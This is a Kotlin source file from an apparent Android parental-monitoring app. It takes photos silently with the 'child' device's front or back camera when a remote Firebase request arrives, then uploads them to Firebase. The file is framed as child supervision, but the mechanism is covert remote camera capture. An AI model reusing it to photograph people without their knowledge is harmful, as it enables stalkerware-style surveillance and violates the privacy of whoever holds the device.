package com.example.authapp.service

import android.content.Context
import android.net.Uri
import com.example.authapp.camera.SilentSnapshotManager
import com.example.authapp.data.FirebaseRepository
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.database.ValueEventListener

class ChildSnapshotHandler(private val context: Context) {

    @Volatile
    var isCapturingSnapshot = false
        private set

    fun takeSnapshot(
        uid: String,
        cameraFacing: String,
        onStartCapture: () -> Unit,
        onFinishCapture: () -> Unit
    ) {
        if (isCapturingSnapshot) {
            FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot requested while already capturing; rejecting duplicate")
            return
        }
        if (uid.isEmpty()) {
            FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot requested with empty UID")
            return
        }

        isCapturingSnapshot = true
        onStartCapture()
        val isFront = cameraFacing.equals("front", ignoreCase = true)
        SilentSnapshotManager(context.applicationContext).captureSnapshot(
            isFront = isFront,
            onCaptured = { file ->
                isCapturingSnapshot = false
                onFinishCapture()
                FirebaseRepository.uploadSnapshot(
                    childId = uid,
                    fileUri = Uri.fromFile(file),
                    cameraFacing = cameraFacing,
                    onSuccess = {
                        FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot uploaded successfully: ${it.id}")
                        try { file.delete() } catch (_: Exception) {}
                    },
                    onFailure = { err ->
                        FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot upload error: $err")
                        FirebaseRepository.reportSnapshotError(uid, err)
                    }
                )
            },
            onError = { err ->
                isCapturingSnapshot = false
                onFinishCapture()
                FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture error: $err")
                FirebaseRepository.reportSnapshotError(uid, err)
            }
        )
    }

    fun listenToSnapshotRequests(
        uid: String,
        isLiveStreamActive: () -> Boolean,
        onStartCapture: () -> Unit,
        onFinishCapture: () -> Unit
    ): ValueEventListener? {
        if (uid.isEmpty()) return null
        return FirebaseRepository.listenToSnapshotRequest(uid) { cameraFacing ->
            if (isLiveStreamActive()) {
                FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot requested while WebRTC video stream active; rejecting request")
                FirebaseRepository.reportSnapshotError(uid, "Camera hardware is currently in use by active live stream")
                return@listenToSnapshotRequest
            }
            takeSnapshot(uid, cameraFacing, onStartCapture, onFinishCapture)
        }
    }
}
